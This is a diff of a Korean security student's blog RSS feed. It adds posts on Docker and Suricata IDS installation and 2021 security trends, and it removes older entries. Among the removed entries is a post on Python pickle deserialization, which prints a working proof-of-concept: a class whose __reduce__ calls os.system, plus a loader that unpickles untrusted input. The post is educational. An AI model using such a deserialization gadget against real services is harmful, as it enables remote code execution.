@@ -9,8 +9,96 @@
     <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>정동현(JHYEON BLOG)</description>
-    <pubDate>Sun, 17 Jan 2021 10:09:55 GMT</pubDate>
+    <pubDate>Sun, 17 Jan 2021 10:17:21 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>2021년 IT/보안 분야 전망/동향 자료</title>
+      <link>https://blog.jhyeon.dev/2021/01/12/newit-210112/</link>
+      <guid>https://blog.jhyeon.dev/2021/01/12/newit-210112/</guid>
+      <pubDate>Mon, 11 Jan 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53&quot;&gt;https://www.notion.so/jhyeon</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53">https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53</a></p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/">정보보안</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EC%B5%9C%EC%8B%A0%EB%8F%99%ED%96%A5/">최신동향</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/01/12/newit-210112/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Ubuntu 20.04 Docker Installation</title>
+      <link>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/</link>
+      <guid>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/</guid>
+      <pubDate>Thu, 07 Jan 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Step-1&quot;&gt;&lt;a href=&quot;#Step-1&quot; class=&quot;headerlink&quot; title=&quot;Step 1&quot;&gt;&lt;/a&gt;Step 1&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;우분투 패키지 업데이트를 진행합니다.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&quot;h</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><ul><li>우분투 패키지 업데이트를 진행합니다.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><ul><li>도커 필수 라이브러리를 설치합니다.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><ul><li>GPG KEY 등록</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><ul><li>Repositry 생성</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line"><span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string"><span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">stable&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><ul><li>도커 설치</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Docker/">Docker</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Ubuntu/">Ubuntu</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Suricata 설치 &amp; 기초</title>
+      <link>https://blog.jhyeon.dev/2021/01/08/suricata-210108/</link>
+      <guid>https://blog.jhyeon.dev/2021/01/08/suricata-210108/</guid>
+      <pubDate>Thu, 07 Jan 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Suricata란&quot;&gt;&lt;a href=&quot;#Suricata란&quot; class=&quot;headerlink&quot; title=&quot;Suricata란?&quot;&gt;&lt;/a&gt;Suricata란?&lt;/h3&gt;&lt;p&gt;IDS(Intrusion Detection System) 시스템으로, 실</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Suricata란"><a href="#Suricata란" class="headerlink" title="Suricata란?"></a>Suricata란?</h3><p>IDS(Intrusion Detection System) 시스템으로, 실시간 IDS, IPS, NSM(Network Security Monitoring) 및 pcap 캡처를 지원한다.</p><h3 id="Suricata-Installation"><a href="#Suricata-Installation" class="headerlink" title="Suricata Installation"></a>Suricata Installation</h3><p>아래 설치 가이드는 우분투 20.04 환경에 맞는 설치 방법이다. 18.04는 아마 “sudo apt install suricata”로도 설치가 가능할 것이다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:oisf/suricata-stable</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install suricata</span><br></pre></td></tr></table></figure><h3 id="Suricata-기본-룰-셋-다운로드"><a href="#Suricata-기본-룰-셋-다운로드" class="headerlink" title="Suricata 기본 룰 셋 다운로드"></a>Suricata 기본 룰 셋 다운로드</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo suricata-update</span><br><span class="line">sudo systemctl restart suricata</span><br></pre></td></tr></table></figure><h3 id="테스트-룰-셋"><a href="#테스트-룰-셋" class="headerlink" title="테스트 룰 셋"></a>테스트 룰 셋</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert tcp any any -&gt; any 80 (msg:<span class="string">&quot;Connection to sites.com&quot;</span>; content:<span class="string">&quot;sites.com&quot;</span>; sid:1001; rev:1;)</span><br></pre></td></tr></table></figure><p>위와 같이 테스트 룰 셋을 짜고 저장하면 80포트로 tcp통신하는 sites.com에 대한 패킷을 로그에 찍을 수 있다.</p><p>로그 파일은 “/var/log/suricata/fast.log”에서 볼 수 있고 tail 명령어로 실시간으로 찍어볼 수도 있다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Suricata/">Suricata</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Network/">Network</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/01/08/suricata-210108/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>Memory Mitigation - Canary</title>
@@ -200,12 +288,12 @@
         
       <description>&lt;p&gt;POX 2020 출제자 Write up 자료입니다.&lt;/p&gt;
 &lt;p&gt;아래 노션에서 풀이를 확인하실 수 있습니다.&lt;/p&gt;
-&lt;p&gt;질문 사항이 있으시면 &lt;a href=&quot;mailto:&amp;#x73;&amp;#x74;&amp;#106;&amp;#x68;&amp;#121;&amp;#101;&amp;#111</description>
+&lt;p&gt;질문 사항이 있으시면 &lt;a href=&quot;mailto:&amp;#x73;&amp;#116;&amp;#x6a;&amp;#x68;&amp;#x79;&amp;#x65;&amp;#x6f</description>
         
       
       
       
-      <content:encoded><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#x73;&#x74;&#106;&#x68;&#121;&#101;&#111;&#x6e;&#64;&#107;&#x61;&#x6b;&#x61;&#x6f;&#x2e;&#99;&#111;&#x6d;">&#x73;&#x74;&#106;&#x68;&#121;&#101;&#111;&#x6e;&#64;&#107;&#x61;&#x6b;&#x61;&#x6f;&#x2e;&#99;&#111;&#x6d;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content:encoded>
+      <content:encoded><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#x73;&#116;&#x6a;&#x68;&#x79;&#x65;&#x6f;&#110;&#64;&#x6b;&#97;&#x6b;&#x61;&#x6f;&#46;&#x63;&#111;&#x6d;">&#x73;&#116;&#x6a;&#x68;&#x79;&#x65;&#x6f;&#110;&#64;&#x6b;&#97;&#x6b;&#x61;&#x6f;&#46;&#x63;&#111;&#x6d;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content:encoded>
       
       
       <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
@@ -510,87 +598,6 @@
       
       
       <comments>https://blog.jhyeon.dev/2020/06/19/bangsiri-wargame-200619/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Python Pickle Library Vulnability</title>
-      <link>https://blog.jhyeon.dev/2020/06/16/python-pickle-200616/</link>
-      <guid>https://blog.jhyeon.dev/2020/06/16/python-pickle-200616/</guid>
-      <pubDate>Mon, 15 Jun 2020 15:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h3 id=&quot;Python-Pickle&quot;&gt;&lt;a href=&quot;#Python-Pickle&quot; class=&quot;headerlink&quot; title=&quot;Python Pickle&quot;&gt;&lt;/a&gt;Python Pickle&lt;/h3&gt;&lt;p&gt;Python Pickle은 직렬화(Picklin</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h3 id="Python-Pickle"><a href="#Python-Pickle" class="headerlink" title="Python Pickle"></a>Python Pickle</h3><p>Python Pickle은 직렬화(Pickling) , 역직렬화(UnPickling) 을 지원하는 모듈 입니다.</p><hr><h3 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h3><p>해당 모듈은 공식 문서에서도 사용을 권장하지 않습니다, 데이터를 역직렬화(UnPickling) 할 때,</p><p>임의의 코드를 실행하는 등의 악의적인 데이터로 구성하여 RCE(Remote Control Exexecution) 등의 공격이 가능하게 됩니다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__getnewargs_ex__()</span><br><span class="line"><span class="built_in">object</span>.__getnewargs__()</span><br><span class="line"><span class="built_in">object</span>.__getstate__()</span><br><span class="line"><span class="built_in">object</span>.__setstate__(state)</span><br><span class="line"><span class="built_in">object</span>.__reduce__()</span><br><span class="line"><span class="built_in">object</span>.__reduce_ex__(protocol)</span><br></pre></td></tr></table></figure><p>reduce() 메서드는 아무런 인자도 받지 않지만, 튜플을 반환할 때 함수를 반환하는 것이 가능합니다.</p><p>[pickling.py]</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">shellcode = cPickle.dumps(Exploit())</span><br><span class="line"><span class="built_in">print</span> base64.b64encode(shellcode)</span><br></pre></td></tr></table></figure><p>[ex.py]</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cPickle.loads(base64.b64decode(data))</span><br></pre></td></tr></table></figure><hr><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://docs.python.org/ko/3/library/pickle.html#data-stream-format">https://docs.python.org/ko/3/library/pickle.html#data-stream-format</a></p></li><li><p><a href="https://github.com/JHye0n/Web-CTF-Cheatsheet">https://github.com/JHye0n/Web-CTF-Cheatsheet</a></p></li></ul>]]></content:encoded>
-      
-      
-      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
-      
-      
-      <category domain="https://blog.jhyeon.dev/tags/Python/">Python</category>
-      
-      
-      <comments>https://blog.jhyeon.dev/2020/06/16/python-pickle-200616/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>S/W 소프트웨어 개발 프로세스 모델</title>
-      <link>https://blog.jhyeon.dev/2020/06/13/swmodel-200613/</link>
-      <guid>https://blog.jhyeon.dev/2020/06/13/swmodel-200613/</guid>
-      <pubDate>Fri, 12 Jun 2020 15:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;p&gt;개발 프로세스와 관련해서 여러 많은 자료를 찾아 보고 개인 공부 겸 정리 하였습니다.&lt;/p&gt;
-&lt;p&gt;이론 부분에 있어서도 한 두가지가 아니다보니 많이 헷갈리는데 앞으로 더 꾸준히 공부해야 겠네요..&lt;/p&gt;
-&lt;p&gt;해당 내용은 아래 노션에 작성되어 있</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<p>개발 프로세스와 관련해서 여러 많은 자료를 찾아 보고 개인 공부 겸 정리 하였습니다.</p><p>이론 부분에 있어서도 한 두가지가 아니다보니 많이 헷갈리는데 앞으로 더 꾸준히 공부해야 겠네요..</p><p>해당 내용은 아래 노션에 작성되어 있습니다.</p><p><a href="https://www.notion.so/jhyeon/S-W-ed3a6d56bb2f42c199e93a15ceb35342">https://www.notion.so/jhyeon/S-W-ed3a6d56bb2f42c199e93a15ceb35342</a></p>]]></content:encoded>
-      
-      
-      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
-      
-      
-      <category domain="https://blog.jhyeon.dev/tags/Algorithm/">Algorithm</category>
-      
-      
-      <comments>https://blog.jhyeon.dev/2020/06/13/swmodel-200613/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>동아리 온라인 시험 플랫폼 개발 후기</title>
-      <link>https://blog.jhyeon.dev/2020/06/12/exam-platformdev-200612/</link>
-      <guid>https://blog.jhyeon.dev/2020/06/12/exam-platformdev-200612/</guid>
-      <pubDate>Thu, 11 Jun 2020 15:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h3 id=&quot;간단-계기&quot;&gt;&lt;a href=&quot;#간단-계기&quot; class=&quot;headerlink&quot; title=&quot;간단, 계기&quot;&gt;&lt;/a&gt;간단, 계기&lt;/h3&gt;&lt;p&gt;요즘 코로나19 영향 때문에 학교는 물론 동아리 운영도 쉽지 않다.&lt;/p&gt;
-&lt;p&gt;이번 동아리 신입생 </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h3 id="간단-계기"><a href="#간단-계기" class="headerlink" title="간단, 계기"></a>간단, 계기</h3><p>요즘 코로나19 영향 때문에 학교는 물론 동아리 운영도 쉽지 않다.</p><p>이번 동아리 신입생 선발 시험에 관련해서 임원진들과 몇가지 생각해본 것이 있는데</p><p>오프라인으로 진행하기에는 사실 장소 대여도 쉽지 않아서 여러 방안을 생각해보다가</p><p>온라인으로 시험을 진행하기로 했는데 이 방법 역시 쉬운 방법만은 아니였다.</p><p>이유는 시험에 대한 감독을 진행할 수 없다는 점(부정 행위)에 대한 문제점이 가장 크게 작용하였는데,</p><p>제출 확인을 할 때 출제자 들이 조금 더 엄격하게 체크해야 하는 쪽이 제일 최선의 방법인 것 같았다.</p><p>또한 C/Python 마다 속해있는 인원이 달라 문제 배포에 대해서도 문제점이 있었는데,</p><p>이 부분은 내가 웹 개발을 해주겠다고 해서 문제가 일단 해결되었다.</p><hr><h3 id="개발-과정"><a href="#개발-과정" class="headerlink" title="개발 과정"></a>개발 과정</h3><p>시험은 오는 6월 18일에 진행을 예정하고 있다. 사실 BoB 준비도 그렇고 다른 일때문에 바쁘다 보니</p><p>5월 말이나 되서야 개발을 시작하게 되었는데 오늘 날짜로 한 2주 살짝 넘게 작업을 했었고,</p><p>교내 동아리 서버를 이용해서 도커로 웹 서버를 구축하고 기능을 하나씩 만들어 갔던 기억이 있다.</p><p>사실 단순하게 운영에 꼭 필요한 기능들만 생각하고 개발을 했는데 시큐어 코딩을 계속 적용해야 하다보니 생각해야할 부분이 많았다.</p><p>또한, 개발하면서 임원진들이 개선 요청이 자주 있었을뿐더러 테스트를 할 때 예상과 다르게 작동되는 기능이 몇가지 있어서 계속 수정 하면서 릴리즈 했던 기억이 있다..</p><hr><h3 id="주요-기능"><a href="#주요-기능" class="headerlink" title="주요 기능"></a>주요 기능</h3><ul><li>로그인</li><li>회원가입</li><li>코드 컴파일러</li><li>시험 문제 풀이</li><li>제출</li></ul><p>[로그인] &amp; [회원가입] : 신입생(회원) 여부를 체크하기 위한 목적</p><p>[코드컴파일러] : 문제를 보고 자신이 작성한 코드가 정상적으로 작동되는지를 보기 위한 컴파일러이다. (Sphere Engine API)</p><p>[시험문제] : 회원가입 때 본인이 응시하겠다고 하는 분야를 바탕으로 (공통 분야/선택한 분야) 를 포함하여 문제가 공개된다.</p><p>[제출] : 제출할 때 편의성(?) 을 조금 더 높히고자 파일을 업로드 받아 메일 서버를 통해서 동아리 관리 계정으로 이메일이 발송되도록 구현 했다.</p><hr><h3 id="개인적인-생각"><a href="#개인적인-생각" class="headerlink" title="개인적인 생각"></a>개인적인 생각</h3><p>혼자서 웹 하나를 구축해 나가면서 생각지도 못한 부분에서 취약점도 있었고, 로직 버그도 1~2개씩 있었던 것 같다.</p><p>그리고 대부분 DB 서버로 연동해서 자동화 처리를 수행했는데 시험 페이지쪽에 시간을 설정하는 쪽에는 아직 수동으로 구축되어 있다.</p><p>이 부분은 아마 이번 주말내에 관리 모듈에서 연동할 수 있도록 해서 추가할 예정중에 있다.</p><p>그리고 기능에 대해서도 자체적으로 구현하면 좋을 수 있는 것들이 많았지만 시간적인 문제도 있었기에 모든 부분을 다 구현하지는 못했다.</p><p>하나의 웹을 만들어 나가면서 부족한 점도 많이 느낄 수 있었던 부분인 것 같다.</p><h3 id="오픈-소스"><a href="#오픈-소스" class="headerlink" title="오픈 소스"></a>오픈 소스</h3><p><a href="https://github.com/JHye0n/bangsiri_online_exam">https://github.com/JHye0n/bangsiri_online_exam</a></p>]]></content:encoded>
-      
-      
-      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
-      
-      
-      <category domain="https://blog.jhyeon.dev/tags/Development/">Development</category>
-      
-      
-      <comments>https://blog.jhyeon.dev/2020/06/12/exam-platformdev-200612/#disqus_thread</comments>
       
     </item>
     
